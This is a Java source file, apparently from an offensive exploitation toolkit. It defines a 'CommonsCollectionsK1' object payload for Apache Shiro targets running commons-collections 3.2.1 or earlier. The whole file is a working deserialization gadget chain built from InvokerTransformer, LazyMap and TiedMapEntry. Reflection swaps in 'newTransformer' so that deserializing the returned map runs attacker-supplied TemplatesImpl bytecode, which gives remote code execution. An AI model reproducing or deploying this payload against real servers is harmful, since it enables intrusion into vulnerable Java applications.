package com.liev.clouds.payload.shiro;

import com.liev.clouds.annotation.Authors;
import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;


@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({"KORLR"})
public class CommonsCollectionsK1 implements ObjectPayload<Map> {
    @Override
    public Map getObject(Object tpl) throws Exception {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<>();
        Map m = LazyMap.decorate(innerMap, (Transformer)transformer);

        Map<Object, Object> outerMap = new HashMap<>();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");

        innerMap.clear();

        ReflectionsUtils.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }
}


